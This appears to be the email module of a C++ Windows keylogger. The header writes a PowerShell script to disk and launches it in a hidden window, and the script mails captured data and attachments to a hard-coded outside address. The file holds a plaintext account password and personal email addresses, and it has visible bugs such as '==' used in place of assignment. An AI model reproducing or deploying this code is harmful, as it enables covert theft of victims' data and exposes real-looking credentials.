#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail{
    #define SMTP ""
    #define PORT ""
    #define USER ""
    #define PASS ""
    #define TO ""
    #define SUB ""
    #define MESSAGE ""
    #define ATT ""

    const std::string &PowerShellScript =
    "function SendMail($smtp,$port,$user,$pass,$to,$sub,$message,$att){"
    "$Cred = New-Object System.Net.NetworkCredential;"
    "$Cred.UserName = $user;"
    "$Cred.Password = $pass;"

    "$msg = New-Object System.Net.Mail.MailMessage;"
    "$msg.IsBodyHtml = 1;"
    "$msg.From = $user;"
    "$msg.To.Add($to);"
    "$msg.Subject = $sub;"
    "$msg.Body = $message;"
    "$msg.Attachments.Add($att);"

    "$email = New-Object System.Net.Mail.SmtpClient;"
    "$email.Host = $smtp;"
    "$email.Port = $port;"
    "$email.EnableSsl = 1;"
    "$email.Credentials = $Cred;"
    "$email.Send($msg)";

    std::string StringReplace(std::string s, const std::string &what, const std::string &with){
        if(what.empty())return s;
        size_t sp = 0;

        while((sp == s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExits( const std::string &f){
        std::ifstream file (f);
        return (bool)file;
    }

    bool CreateScript(){
        std::ofstream script(IO::GetOurPath(true)+std::string(SCRIPT_NAME));
        if(!script) return false;
        script << PowerShellScript;
        if(!script) return false;
        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments){
        bool ok;
        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok) return -1;
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExits(scr_path)) ok = CreateScript();
        if(!ok) return -2;

        std::string param1 = scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") + "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") + "\" -Att \""
                            + attachments + "\"";
        std::string param2 = "SendMail -smtp \"stmp.live.com\" -port 25 -user \"cloud_log@hotmail.com\" -pass \"H41r4610n3\" -to \"luanveloz@gmail.com\" -sub \""
                            +StringReplace(subject, "\"", "\\\"")+"\" -message \""
                            +StringReplace(body, "\"", "\\\"")+"\" -att \""
                            + attachments +"\" ";


        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param1.c_str();
        ShExecInfo.lpParameters = param2.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp == NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok) return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&](){
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE) TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return Code: "+Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    int SendMail(const std::string &subject, const std::string &body,
                 const std::vector<std::string> &att){
        std::string attachments ="";
        if(att.size() == 1U)
            attachments = att.at(0);
        else{
            for (const auto &v : att)
                attachments += v + "::";
                attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments);
    }
}

#endif // SENDMAIL_H
